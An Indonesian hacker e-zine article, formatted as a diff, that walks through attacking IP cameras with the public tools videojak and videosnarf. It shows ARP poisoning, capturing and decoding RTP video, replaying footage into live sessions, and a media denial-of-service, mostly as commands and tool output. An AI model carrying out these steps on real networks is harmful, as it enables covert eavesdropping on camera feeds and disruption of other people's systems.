@@ -1,0 +1,238 @@
+ECHO MAGAZINE VOLUME X, ISSUE XXV, PHILE 0x06.TXT
+__________       ______  __       __________________               
+___  ____/__________  / / /______ ____  /___  /___(_)_______ _____ 
+__  __/   _  ___/__  /_/ / _  __ \___  / __  / __  / __  __ \_  _ \
+_  /___   / /__  _  __  /  / /_/ /__  /  _  /___  /  _  / / //  __/
+/_____/   \___/  /_/ /_/   \____/ _  /   /____//_/   /_/ /_/ \___/ 
+                                  /_/
+  Hacker Log Book: Attacking IP Camera 4 lulz 
+  d.m0nk3y [at] echo [dot] or [dot] id
+
+-----[ Pendahuluan
+
+Internet protocol camera atau biasa di sebut ip camera, adalah tipe kamera
+digital yang umumnya digunakan untuk melakukan pengawasan. Ada cuma macam IP
+camera, Centralized IP camera danDecentralized IP camera. Centralized IP camera
+membutuhkan Network Video Recorder (NVR) untuk menghandle proses recording
+video dan manajemen alarm.  Decentralized IP camera, tidak membutuhkan Network
+Video Recorder (NVR), camera ini mempunyai fungsi recoding didalamnya dan dapat
+disimpan secara langsung melalui media simpan seperti flash disk, hardisk, dan
+NAS.
+
+Seperti layaknya sebuah computer, ip camera juga memiliki ip address yang dapat
+terhubung pada jaringan kabel/nirkabel.  IP camera pada saat ini, pada umumnya
+memiliki fungsi untuk menjalankan web server, ftp, email, networking, dan
+security protocols. IP camera dapat secara langsung melakukan streaming dengan
+kualitas MJPEG, MPEG-4 atau menggunakan h.264 melalui beberapa network
+protocols. Network protocol yang biasa digunakan untuk melakukan streaming
+video pada ip camera adalah HTTP streaming dan RTP. Real-time Transport
+Protocol (RTP) ditetapkan sebagai stardar format packet yang digunakan untuk
+mengirimkan audio dan video melaui internet protocol.
+
+Beberapa celah keamanan tentang teknologi ip camera dipresentasikan oleh Jason
+Ostrom dan Arjun Sambamoorthy pada saat DEFCON 17 :
+ - Video Eavesdropping
+ - Video Replay dan Video Hijack
+ - Video Denial of Services ( DoS )
+
+-----[ IP Video Replay Attack
+
+Jason Ostrom dan Arjun Sambamoorthy merilis tool bernama videojak, yang dapat
+digunakan untuk melakukan video hijacking terhadap ip camera. Videojak berjalan
+seperti ettercap (tools) yang digunakan untuk melakukan arp poisoning pada area
+network.
+
+client <-------------------------------> ip camera
+	  	        |
+		        |
+	 	     attacker	
+
+g0at m0nk3y # /usr/local/bin/videojak -i eth0 // //
+UCSniff 3.10 starting
+Listening on eth0... (Ethernet)
+
+  eth0 ->	aa:bb:cc:aa:bb:cc     192.168.7.119     255.255.255.0
+
+
+Randomizing 255 hosts for scanning...
+* |==================================================>| 100.00 %
+
+7 hosts added to the hosts list...
+7 hosts saved to arpsaver.txt 
+
+ARP poisoning victims:
+
+ GROUP 1 : ANY (all the hosts in the list)
+
+ GROUP 2 : ANY (all the hosts in the list)
+
+Starting Unified sniffing...
+
+Warning:  Please ensure that you hit 'q' when you are finished with this program.
+Warning:  'q' re-ARPs the victims.  Failure to do so before program exit will result in a DoS.
+
+attacker melakukan sniffing dengan tujuan mendapatkan packet data dari client <-> ip camera
+
+g0at tmp # tshark -i eth0 -w packet.pcap
+Running as user "root" and group "root". This could be dangerous.
+Capturing on eth0
+105615 ^C
+587 packets dropped
+
+berikut ini adalah hasil sniffing menggunakan wireshark :
+
+1178    2.577886    aa:bb:cc:aa:bb:cc    58:6d:8f:b6:81:df    ARP    192.168.7.119 is at aa:bb:cc:aa:bb:cc \
+(duplicate use of 192.168.7.1 detected!)
+1179    2.577906    aa:bb:cc:aa:bb:cc    60:33:4b:3a:5a:6b    ARP    192.168.7.1 is at aa:bb:cc:aa:bb:cc \
+ (dupliate use of 192.168.7.119 detected!)
+1180    2.588003    aa:bb:cc:aa:bb:cc    58:6d:8f:b6:81:df    ARP    192.168.7.35 is at aa:bb:cc:aa:bb:cc \
+ (duplicate use of 192.168.7.1 detected!)
+1181    2.588022    aa:bb:cc:aa:bb:cc    80:1f:02:2d:52:14    ARP    192.168.7.1 is at aa:bb:cc:aa:bb:cc \ 
+(duplicate use of 192.168.7.35 detected!)
+
+dari hasil sniffing diatas diketahui bahwa attacker mencoba meracuni arp tabel
+host-host yang hidup di network.
+
+Karena komunikasi data antara client dan ip camera tidak terenkripsi, attacker
+mencoba melakukan melakukan dump sebuah file .pcap menjadi RTP sessions yang di
+encode dengan h.264 video codec. Jason Ostrom dan Arjun Sambamoorthy membuat
+tool yang dapat melakukan dump RTP session bernama videosnarf. Videosnarf
+terinspirasi dari rtpbreaktool dimana dengan tool tersebut kita dapat
+merekonstruksi dan menganalisa RTP session.
+
+g0at tmp # /usr/local/bin/videosnarf -i sniff.pcap 
+Starting videosnarf 0.63
+[+]Starting to snarf the media packets 
+[+] Please wait while decoding pcap file...
+
+nanti akan muncul banyak file hasil dump H264-media-<nomor>.264 coba gunakan
+salah file tersebut untuk diconvert, biasanya file yang memiliki size yang
+terbesar dialah yang akan kita coba convert  menjadi *.avi dengan tujuan dapat
+dikenali oleh video player.
+
+g0at tmp # ffmpeg -i H264-media-1.264 tia.avi
+ffmpeg version 0.7.8, Copyright (c) 2000-2011 the FFmpeg developers
+  built on Feb 15 2012 12:04:36 with gcc 4.5.3
+  configuration: --prefix=/usr --libdir=/usr/lib --shlibdir=/usr/lib --mandir=/usr/share/man --enable-shared 
+  --cc=i686-pc-linux-gnu-gcc --disable-static --enable-gpl --enable-postproc --enable-avfilter --disable-stripping 
+  --disable-debug --disable-doc --disable-vaapi --disable-ffplay --disable-vdpau --enable-libmp3lame 
+  --enable-libx264 --enable-libxvid --disable-indev=v4l --disable-indev=v4l2 --enable-librtmp --disable-altivec
+  --cpu=i686 --enable-hardcoded-tables
+  libavutil    50. 43. 0 / 50. 43. 0
+
+jalankan lagi program videojak, lakukan arp poisoning, dan pilih opsi f untuk
+melakukan penyerangan video replay attack.
+
+Inline help:
+
+ [vV]      - change the visualization mode
+ [lL]      - print the hosts list
+ [oO]      - print the profiles list
+ [cC]      - print the connections list
+ [aA]      - print the Directory Users List
+ [dD]      - attack an active video call by sending garbage video payload
+ [fF]      - plays the video file on the active video conference
+ [pP]      - attack an active video call by dropping video packets
+ [sS]      - stop the video attack, started by p or f switch
+ [iI]      - arp poison the hosts using unicast ARP requests
+ [rR]      - print the hosts that have GARP feature disabled
+ [tT]      - print the Targets List
+ [yY]      - print the Active Calls in progress
+ [<space>] - stop/cont printing packets
+ [qQ]      - quit
+
+
+Hosts list:
+
+1)      192.168.7.1     58:6D:8F:B6:81:DF
+2)      192.168.7.35    80:1F:02:2D:52:14
+3)      192.168.7.119   aa:bb:cc:aa:bb:cc
+4)      192.168.7.129   D8:5D:4C:80:EF:01
+5)      192.168.7.149   00:1C:BF:05:8F:E2
+
+
+Index     Call Session
+--------------------------------------------------------------------
+[1]    Source: 192.168.7.35[50480] --> Dest: 192.168.7.149[60646]
+[2]    Source: 192.168.7.35[56886] --> Dest: 192.168.7.119[33728]
+--------------------------------------------------------------------
+
+[+] Enter the active session index to attack: [1 - 2]
+[+] You can enter 0 to start over again 
+ Please select the victim phone/camera model
+[1] Cisco 7985
+[2] Axis Q1755
+[3] Other
+Please select attack type 
+[1] Indefinite looping
+[2] One time attack 
+[+] Please select one the 59 listed file to be played 
+1.H264-media-39.264
+2.tia.avi
+3.packet.pcap
+Please enter the file index:
+[+]Starting the video replay attack ...........Please wait until the attack is stopped
+[+] Press ctrl+c ONCE to stop the attack. It will take a few seconds for the attack to be stopped. 
+
+
+-----[ Media Denial Of Service
+
+Exploitasi ini masukkan kedalam tool videojak, exploitasinya attacker tetap
+harus melakukan poisoning terlebih dahulu untuk melakukan data gathering.
+
+localhost m0nk3y # /usr/local/bin/videojak -i eth0 //
+videojak 2.00 starting
+File targets.txt can't be opened for reading in working directory
+Listening on eth0... (Ethernet)
+
+  eth0 ->	aa:bb:cc:aa:bb:cc     192.168.7.119     255.255.255.0
+
+
+Randomizing 255 hosts for scanning...
+Scanning the whole netmask for 255 hosts...
+* |==================================================>| 100.00 %
+
+8 hosts added to the hosts list...
+8 hosts saved to arpsaver.txt 
+
+ARP poisoning victims:
+
+ GROUP 1 : ANY (all the hosts in the list)
+
+ GROUP 2 : ANY (all the hosts in the list)
+
+Starting Unified sniffing...
+
+Warning:  Please ensure that you hit 'q' when you are finished with this program.
+Warning:  'q' re-ARPs the victims.  Failure to do so before program exit will result in a DoS.
+
+Index     Call Session
+--------------------------------------------------------------------
+[1]    Source: 192.168.7.35[56062] --> Dest: 192.168.7.149[54986]
+--------------------------------------------------------------------
+
+[+] Only 1 call with index [1] detected
+[+] Enter the active session index to attack: [1]  
+[+] You can enter 0 to start over again 
+ [+] Please wait while VideoJak gathers required Attack data.
+[+] Setting pcap filter for destination IP address 192.168.7.149 and udp port 54986
+[+] Searching for Audio and Video RTP Streams in the pcap handle.
+............................................................................................
+............................................................................................
+............................................................................................
+[+] Caught signal!! Stopping attack...
+
+
+hasil analysis dari tehnik serangan di atas adalah attacker berusaha membuat
+custom video payload dengan merubah sequence number dan nilai timestamp yang
+digunakan oleh packet RTP yang asli. Setelah user memilih target video device
+yang ingin diserang pada saat session berlangsung, videojak mengirimkan payload
+melalui RTP port yang sudah di custom kepada target.  Mengirimkan packet audio
+dan video secara random kepada target, sehingga kualitas suara dan video
+menurun.
+
+-----[ Referensi :
+http://en.wikipedia.org/wiki/IP_camera
+https://www.defcon.org/images/defcon-17/dc-17-presentations/defcon-17-ostrom-sambamoorthy-video_application_attacks.pdf
+http://videojak.sourceforge.net/
+http://ucsniff.sourceforge.net/
